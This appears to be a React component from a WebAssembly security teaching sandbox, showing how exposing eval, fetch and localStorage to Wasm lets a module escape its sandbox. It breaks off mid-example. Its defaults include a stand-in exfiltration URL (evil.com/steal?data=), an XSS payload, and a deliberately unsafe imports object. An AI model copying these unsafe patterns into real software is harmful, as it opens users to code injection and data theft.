import React, { useState, useContext } from 'react';
import { WasmErrorContext } from '../../../../App';
import * as wasm from 'wasm-security-test';
import CodeViewer from '../../../Utils/CodeViewer';
import '../../../../styles/sandbox-escapes/dangerous-host-exposure.css';

// Simulate dangerous host functions that could be exposed
const dangerousHostFunctions = {
  unsafeEval: (code: string) => {
    try {
      // In a real scenario, this would be actual eval()
      // For demo safety, we'll simulate the danger
      if (code.includes('alert') || code.includes('fetch') || code.includes('localStorage')) {
        return `DANGER: Would execute: ${code}`;
      }
      return `Simulated eval result: ${code}`;
    } catch (e) {
      return `Error: ${e}`;
    }
  },
  
  unsafeFetch: (url: string) => {
    // Simulate dangerous network access
    return `DANGER: Would fetch from: ${url} (potentially exfiltrating data)`;
  },
  
  unsafeLocalStorage: (key: string, value: string) => {
    // Simulate dangerous storage access
    return `DANGER: Would store in localStorage: ${key} = ${value}`;
  }
};

const DangerousHostExposure: React.FC = () => {
  const [exploitCode, setExploitCode] = useState('alert("XSS from WASM!")');
  const [fetchUrl, setFetchUrl] = useState('https://evil.com/steal?data=');
  const [storageKey, setStorageKey] = useState('sensitive_token');
  const [storageValue, setStorageValue] = useState('user_session_12345');
  const [results, setResults] = useState<{[key: string]: string}>({});
  const [activeDemo, setActiveDemo] = useState<string | null>(null);
  const { addError } = useContext(WasmErrorContext);

  const runEvalExploit = () => {
    try {
      setActiveDemo('eval');
      const result = wasm.unsafe_eval_access(exploitCode);
      setResults(prev => ({ ...prev, eval: result }));
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  const runFetchExploit = () => {
    try {
      setActiveDemo('fetch');
      const result = wasm.unsafe_fetch_access(fetchUrl);
      setResults(prev => ({ ...prev, fetch: result }));
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  const runStorageExploit = () => {
    try {
      setActiveDemo('storage');
      const result = wasm.unsafe_storage_access(storageKey, storageValue);
      setResults(prev => ({ ...prev, storage: result }));
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  const runSafeVersion = () => {
    try {
      setActiveDemo('safe');
      const result = wasm.safe_restricted_access();
      setResults(prev => ({ ...prev, safe: result }));
    } catch (error) {
      addError(`Error: ${error}`);
    }
  };

  return (
    <div className="dangerous-host-exposure">
      <h3>Dangerous Host Function Exposure</h3>
      
      <div className="exploit-description">
        <p>
          This demonstration shows how WebAssembly's sandbox can be compromised when the host 
          (JavaScript) carelessly exposes dangerous functions to the Wasm module. WebAssembly 
          itself provides no protection against this - it assumes the host makes good decisions 
          about what functions to expose.
        </p>
        <p>
          <strong>The Risk:</strong> Any JavaScript function can be exposed to WebAssembly through 
          the imports object. If dangerous functions like <code>eval()</code>, <code>fetch()</code>, 
          or <code>localStorage</code> access are exposed, the Wasm module can escape its intended 
          sandbox and perform privileged operations.
        </p>

        <CodeViewer 
          title="Dangerous Host Function Exposure Implementation"
          unsafeCode={`// UNSAFE: Host exposes dangerous functions to WASM
// JavaScript side - BAD PRACTICE:
const imports = {
  env: {
    js_eval: (code_ptr, code_len) => {
      const code = getString(code_ptr, code_len);
      return eval(code); // DANGEROUS: Exposes eval to WASM!
    },
    js_fetch: (url_ptr, url_len) => {
      const url = getString(url_ptr, url_len);
      fetch(url); // DANGEROUS: Unrestricted network access
    },
    js_localStorage_set: (key_ptr, key_len, val_ptr, val_len) => {
      const key = getString(key_ptr, key_len);
      const val = getString(val_ptr, val_len);
      localStorage.setItem(key, val); // DANGEROUS: Storage access
    }
  }
};
